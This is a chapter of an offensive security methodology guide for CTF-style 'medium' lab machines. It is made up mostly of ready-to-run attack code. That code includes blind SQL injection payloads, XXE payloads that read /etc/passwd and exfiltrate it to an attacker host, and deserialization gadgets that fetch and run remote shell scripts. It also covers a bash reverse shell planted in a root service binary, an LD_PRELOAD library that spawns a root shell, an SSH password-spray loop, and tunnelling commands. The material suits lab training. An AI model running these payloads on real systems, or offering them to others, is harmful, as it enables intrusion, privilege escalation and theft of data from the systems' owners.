[◀ Prev: Easy Machines](07-easy-machines.md) · [🏠 Index](README.md) · [Next: Hard Machines ▶](09-hard-machines.md)

---

# 08 · 🟡 Medium Machines — Complete Methodology

> [!NOTE]
> **Medium machine mindset.** Medium machines require chaining 2–3 vulnerabilities. The foothold often involves a less obvious web vulnerability (blind SQLi, deserialization, filter bypass), or custom-written software with a subtle flaw. Privilege escalation typically requires identifying and abusing a service running as root, a writable configuration, or a custom SUID binary. Expect to enumerate more deeply and think about second-order effects of what you find.

## 8.1 Medium Machine — Deeper Enumeration Needed

```bash
# Extended web fuzzing — use bigger wordlists
ffuf -u http://$TARGET/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt \
  -e .php,.html,.txt,.bak,.old,.conf,.json,.yaml,.yml,.xml \
  -mc 200,204,301,302,307,401,403 -t 100

# Parameter fuzzing — find hidden parameters
arjun -u http://$TARGET/api/endpoint --get
ffuf -u 'http://$TARGET/api?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

# API endpoint discovery
ffuf -u http://$TARGET/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Check all ports — medium machines often hide services on high ports
sudo nmap -p- --min-rate 5000 $TARGET
curl http://$TARGET:8080/ http://$TARGET:8443/ http://$TARGET:3000/ 2>/dev/null | head -10
```

## 8.2 Advanced Web Exploitation for Medium

### Blind SQLi — Fully Manual

```sql
-- Boolean-based blind — enumerate character by character
' AND SUBSTRING(database(),1,1)='a'--    -- (changes response if true)
```

```bash
# sqlmap on blind injection
sqlmap -u 'http://$TARGET/item?id=1' --technique=B --batch --dbs --level=3
```

```sql
-- Time-based blind
' AND IF(SUBSTRING(user(),1,4)='root', SLEEP(5), 0)--
```

```bash
# sqlmap time-based
sqlmap -u 'http://$TARGET/item?id=1' --technique=T --batch --dbs --time-sec=3
```

### XML External Entity (XXE)

```xml
<!-- Basic XXE payload — read /etc/passwd -->
<?xml version='1.0'?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<root>&xxe;</root>

<!-- XXE via SVG file upload -->
<?xml version='1.0' standalone='yes'?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
<svg>&xxe;</svg>

<!-- Blind OOB XXE — exfil via DNS/HTTP -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://ATTACKER/evil.dtd'> %xxe;]>
```

```dtd
<!-- evil.dtd content: -->
<!ENTITY % data SYSTEM 'file:///etc/passwd'>
<!ENTITY % oob '<!ENTITY exfil SYSTEM "http://ATTACKER/?x=%data;">'>
%oob;
```

### Deserialization

```bash
# PHP deserialization — look for unserialize() calls with user input
# Check cookies, hidden fields for base64-encoded serialized objects

# PHPGGC — PHP gadget chain generator
phpggc Laravel/RCE1 system 'id' -b
phpggc Symfony/RCE4 system 'id' -b

# Java deserialization
ysoserial CommonsCollections1 'curl http://ATTACKER/shell.sh | bash' > payload.ser

# Python pickle deserialization
python3 -c "
import pickle, os, base64
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('curl http://ATTACKER/s.sh|bash',))
print(base64.b64encode(pickle.dumps(Exploit())).decode())"
```

## 8.3 Medium Machine — Privilege Escalation Patterns

### Pattern 1 — Writable Service File

```bash
# Find services running as root
ps aux | grep root
systemctl list-units --type=service

# Check service file permissions
find /etc/systemd /lib/systemd -type f -name '*.service' 2>/dev/null | xargs ls -la 2>/dev/null | grep -v root

# If service binary is writable:
ls -la /opt/custom_service

# Overwrite binary with reverse shell
cp /opt/custom_service /tmp/backup_service
echo '#!/bin/bash' > /opt/custom_service
echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /opt/custom_service

# Restart service (if permitted by sudo)
sudo systemctl restart custom_service
```

### Pattern 2 — Credential Reuse Across Users

```bash
# Found credentials in web app, config file, or database?
# Try them everywhere:

# Check all users on the system
cat /etc/passwd | grep '/bin/bash\|/bin/sh'

# Try found password with each user
su - user1    # Enter found password
su - user2

# SSH password spray
for user in $(cat /etc/passwd | grep bash | cut -d: -f1); do
  echo "Trying $user"
  sshpass -p 'found_password' ssh -o StrictHostKeyChecking=no $user@$TARGET
done

# Check /home directories for .ssh keys, credential files, notes
ls -la /home/*/
cat /home/*/.bash_history 2>/dev/null
find /home -name '*.txt' -o -name '*.conf' -o -name '*.php' 2>/dev/null | head -20
```

### Pattern 3 — LD_PRELOAD / LD_LIBRARY_PATH Hijacking

```bash
# Check sudo -l output for env_keep options
sudo -l
# If output shows:
#   env_keep+=LD_PRELOAD
# Then exploit:
```

```c
// Create malicious shared library — /tmp/shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so [any_sudo_allowed_command]

# LD_LIBRARY_PATH attack on custom binary with missing shared lib
ldd /path/to/suid_binary
# If: not found -> create malicious version in writable dir
gcc -shared -o /tmp/missing_lib.so.1 -fPIC malicious.c
LD_LIBRARY_PATH=/tmp /path/to/suid_binary
```

### Pattern 4 — Internal Port Forwarding

```bash
# Discover internal services
ss -tulpn
netstat -tulpn 2>/dev/null
# Example: 127.0.0.1:8080 running as root

# Forward to your attacker machine

# Method 1: SSH local port forward (if SSH creds available)
ssh -L 9001:127.0.0.1:8080 user@$TARGET
# Then access: curl http://localhost:9001/

# Method 2: Chisel tunnel
# On attacker:
chisel server --reverse -p 8888
# On target:
chisel client ATTACKER:8888 R:9001:127.0.0.1:8080
# Then: curl http://localhost:9001/

# Method 3: socat (if available on target)
socat TCP-LISTEN:9001,fork TCP:127.0.0.1:8080 &
# Then access $TARGET:9001 from attacker
```

---

[◀ Prev: Easy Machines](07-easy-machines.md) · [🏠 Index](README.md) · [Next: Hard Machines ▶](09-hard-machines.md)
